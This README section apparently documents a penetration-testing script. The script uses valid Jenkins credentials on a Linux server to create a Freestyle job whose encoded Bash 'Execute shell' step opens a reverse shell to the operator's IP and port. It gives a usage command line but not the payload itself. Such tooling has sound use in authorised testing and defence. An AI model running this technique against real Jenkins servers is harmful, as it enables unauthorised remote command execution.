## linux_revshell_cmd.py
This script is useful when you have valid credentials and want to check if it can be use to spawn a reverse shell.\
The Jenkins server must be installed on Linux.\
To be able to receive a reverse shell, the user must have BUILD and JOB CREATION privileges.\
Once logged in on Jenkins, the script creates a new **"Freestyle project"** JOB.\
![linux_revshell_cmd_1](https://github.com/stevenvegar/Jenkins_scripts/blob/main/linux_revshell_cmd.py/images/linux_revshell_cmd_1.png)

Then configures or BUILD it to **"Execute shell"** with the **Bash** encoded payload.
![linux_revshell_cmd_2](https://github.com/stevenvegar/Jenkins_scripts/blob/main/linux_revshell_cmd.py/images/linux_revshell_cmd_2.png)

Finally, the script sends the instruction to execute this JOB.

USAGE:\
python3 ./linux_revshell_cmd.py -w URL -r LOCAL_IP -rp LOCAL_PORT
![linux_revshell_cmd_3](https://github.com/stevenvegar/Jenkins_scripts/blob/main/linux_revshell_cmd.py/images/linux_revshell_cmd_3.png)
![linux_revshell_cmd_4](https://github.com/stevenvegar/Jenkins_scripts/blob/main/linux_revshell_cmd.py/images/linux_revshell_cmd_4.png)

Tested on Jenkins 2.150.2 on Ubuntu Server 22.04.3 LTS
